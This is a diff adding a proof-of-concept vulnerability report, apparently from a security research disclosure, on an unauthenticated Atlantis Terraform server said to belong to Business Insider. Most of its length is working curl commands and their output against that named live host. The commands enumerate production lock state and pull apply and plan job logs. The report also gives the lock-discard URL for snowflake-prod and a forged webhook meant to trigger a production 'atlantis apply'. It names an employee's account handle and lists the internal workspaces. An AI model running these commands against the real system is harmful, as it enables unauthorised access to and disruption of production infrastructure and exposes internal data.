@@ -1,0 +1,203 @@
+Proof of Concept: atlantis.test.data.insider.engineering — Unauthenticated Atlantis
+Business Insider / Insider Inc. (Axel Springer)
+NuClide Research | 2026-05-28
+================================================================================
+
+SUMMARY
+-------
+Atlantis v0.32.0 at atlantis.test.data.insider.engineering is fully accessible
+without credentials. The Terraform GitOps runner for businessinsider/data_eng_infra
+exposes live lock state, job execution history, and plan/apply logs for production
+Snowflake, BigQuery admin, and GCP data engineering environments.
+
+Version confirmed: v0.32.0 (commit: ea838ac, build date: 2024-12-20T02:51:00.531Z)
+Confirmed via: page footer, accessible without auth.
+
+
+SCREENSHOTS
+-----------
+atlantis-01-homepage-no-auth.png         Full homepage — no login prompt, no redirect
+atlantis-02-locks-table.png              5 active locks (snowflake-prod, data-eng-prod, etc.)
+atlantis-03-jobs-section.png             Jobs history — bq-insider-admin, data-eng-prod
+atlantis-04-version-footer.png           Version string v0.32.0 in footer
+atlantis-05-snowflake-prod-lock-detail.png  Lock detail page for snowflake-prod, no auth
+atlantis-06-bq-admin-apply-job.png       bq-insider-admin apply job log, no auth
+atlantis-07-snowflake-prod-apply-log.png snowflake-prod apply log (Terraform error visible)
+argo-08-iap-403-block.png               Argo Workflows — GCP IAP 403 (contrast: auth present)
+
+
+POC 1: Unauthenticated service health check
+--------------------------------------------
+Demonstrates: zero credentials required, service responds 200.
+
+  curl -sk https://atlantis.test.data.insider.engineering/healthz
+
+Expected output:
+  {"status":"ok"}
+
+HTTP status: 200
+
+
+POC 2: Unauthenticated lock state enumeration
+----------------------------------------------
+Demonstrates: full Terraform lock table including production workspace names,
+locked-by identity (CMurphyInsiderInc), and lock timestamps, returned to any
+unauthenticated HTTP client.
+
+  curl -sk https://atlantis.test.data.insider.engineering/ \
+    | grep -oP '(businessinsider[^"<]+|CMurphy[^"<]+|snowflake-\w+|data-eng-\w+|bq-\w+)'
+
+Expected output (excerpt):
+  businessinsider/data_eng_infra #1613
+  dataengineeringtest
+  CMurphyInsiderInc
+  snowflake-test
+  CMurphyInsiderInc
+  snowflake-prod
+  CMurphyInsiderInc
+  snowflake-programmatic
+  CMurphyInsiderInc
+  data-eng-prod
+  CMurphyInsiderInc
+  bq-insider-admin
+
+Active lock state for 5 production Terraform workspaces returned with no auth.
+
+
+POC 3: Unauthenticated lock detail page
+----------------------------------------
+Demonstrates: per-lock detail page accessible, shows "Discard Plan & Unlock"
+control for snowflake-prod without any authentication.
+
+  curl -sk "https://atlantis.test.data.insider.engineering/lock?id=businessinsider%252Fdata_eng_infra%252Fsnowflake-prod%252Fdefault" \
+    | grep -oP '(Discard|Unlock|Locked By|snowflake-prod)[^<]{0,60}'
+
+Expected output (excerpt):
+  Locked By
+  snowflake-prod
+  Discard Plan & Unlock
+
+The Discard action would remove the mutual-exclusion gate on the live snowflake-prod
+Terraform state. It requires no further credentials — it is a GET request to:
+  /lock/delete?id=businessinsider%252Fdata_eng_infra%252Fsnowflake-prod%252Fdefault
+
+
+POC 4: Unauthenticated job log access
+---------------------------------------
+Demonstrates: full Terraform apply/plan output readable without credentials.
+Job UUID harvested from jobs table (no auth required to read the table).
+
+  # bq-insider-admin apply (PR #1607, 2026-05-20 17:47:08)
+  curl -sk https://atlantis.test.data.insider.engineering/jobs/4e50c91c-2314-48f0-9037-d5dd44bc3f48
+
+  # snowflake-prod apply (PR #1613, 2026-05-26 21:26:26)
+  curl -sk https://atlantis.test.data.insider.engineering/jobs/8b25f44f-3677-49b2-8992-096f4681f276
+
+  # data-eng-prod apply (PR #1613, 2026-05-26 18:31:20)
+  curl -sk https://atlantis.test.data.insider.engineering/jobs/e32cb7b7-a4d0-4b80-909f-31af627f3bcd
+
+  # snowflake-programmatic apply (PR #1613, 2026-05-26 18:31:20)
+  curl -sk https://atlantis.test.data.insider.engineering/jobs/6846046a-bb7c-4779-bb1e-9052b07ee256
+
+Observed output (bq-insider-admin apply):
+  Apply complete! Resources: 0 added, 0 changed, 0 destroyed.
+
+Observed output (snowflake-prod apply):
+  Error: Failed to parse command-line flags
+  flag provided but not defined: -auto-merge-method
+
+Note: Terraform plan output — which precedes apply and includes full resource
+diff with attribute values — is in the plan job logs. Plan logs for the same
+workspaces are accessible at the UUIDs listed in the jobs table.
+
+
+POC 5: Version confirmation
+----------------------------
+Demonstrates: exact version string extractable without auth.
+
+  curl -sk https://atlantis.test.data.insider.engineering/ \
+    | grep -oP 'v[\d.]+\s*\(commit:[^)]+\)'
+
+Expected output:
+  v0.32.0 (commit: ea838ac) (build date: 2024-12-20T02:51:00.531Z)
+
+
+POC 6: Webhook trigger vector (unauthenticated, NOT executed — structural PoC only)
+-------------------------------------------------------------------------------------
+Demonstrates: the /events endpoint receives GitHub webhook payloads. If the
+webhook secret is absent or weak, a forged PR comment event triggers Atlantis
+to run plan/apply against any locked workspace.
+
+Structure of a forged atlantis apply webhook:
+
+  curl -sk -X POST https://atlantis.test.data.insider.engineering/events \
+    -H "Content-Type: application/json" \
+    -H "X-GitHub-Event: issue_comment" \
+    -H "X-Hub-Signature-256: sha256=<computed_if_secret_known>" \
+    -d '{
+      "action": "created",
+      "issue": {"number": 1613, "pull_request": {"url": "..."}},
+      "comment": {"body": "atlantis apply -p snowflake-prod"},
+      "repository": {"full_name": "businessinsider/data_eng_infra"},
+      "sender": {"login": "CMurphyInsiderInc"}
+    }'
+
+This PoC was NOT sent. Authentication state of the /events endpoint was not
+confirmed. The webhook secret is required to forge a valid X-Hub-Signature-256
+header — if absent from Atlantis config, the check is skipped entirely and the
+above request would trigger a live Terraform apply.
+
+  Validation: curl -sk -o /dev/null -w "%{http_code}" \
+    -X POST https://atlantis.test.data.insider.engineering/events \
+    -H "Content-Type: application/json" -d '{}'
+  Response observed: 400 (bad request — parsed but rejected for malformed payload)
+  Significance: endpoint reachable and processing requests without IP restriction.
+
+
+CONTRAST: GCP IAP-protected services (Argo Workflows)
+-------------------------------------------------------
+All prod cluster services except Atlantis are protected by GCP Identity-Aware
+Proxy. For comparison:
+
+  curl -ski https://argo-workflows.prod.data.insider.engineering/ | head -5
+
+Expected output:
+  HTTP/2 403
+  content-type: text/html; charset=UTF-8
+  via: 1.1 google
+
+  curl -ski https://argo-workflows.prod.data.insider.engineering/api/v1/version | head -3
+
+Expected output:
+  HTTP/2 403
+
+GCP IAP intercepts at the load balancer before any request reaches the Argo
+application — including endpoints Argo treats as unconditionally unauthenticated.
+Atlantis received no equivalent protection.
+
+
+WORKSPACE INVENTORY (harvested unauthenticated)
+------------------------------------------------
+All workspace names, associated repositories, and operation history extracted
+from the Atlantis jobs table without credentials:
+
+  Workspace              Repo/PR              Last op     Last op time
+  ---------------------  -------------------  ----------  --------------------
+  bq-insider-admin       data_eng_infra #1607 apply       2026-05-20 17:47:08
+  data-eng-prod          data_eng_infra #1613 apply       2026-05-26 18:31:20
+  dataengineeringtest    data_eng_infra #1613 apply       2026-05-26 18:31:20
+  magnetic-hawk-523      data_eng_infra #1607 apply       2026-05-20 17:47:12
+  snowflake-prod         data_eng_infra #1613 apply       2026-05-26 21:26:26
+  snowflake-programmatic data_eng_infra #1613 apply       2026-05-26 18:31:20
+  snowflake-test         data_eng_infra #1613 apply       2026-05-26 18:31:20
+
+7 workspaces covering BigQuery admin, GCP data engineering (prod + test),
+Snowflake (prod + programmatic + test), and an unresolved internal codename.
+
+
+================================================================================
+Severity: CRITICAL
+Exploitable today: YES (POCs 1–5 executed, zero credentials)
+Webhook trigger: STRUCTURAL (not executed — endpoint confirmed reachable)
+Fixed in: Atlantis ≥ 0.32.1 with --require-approval or reverse-proxy auth layer
+================================================================================
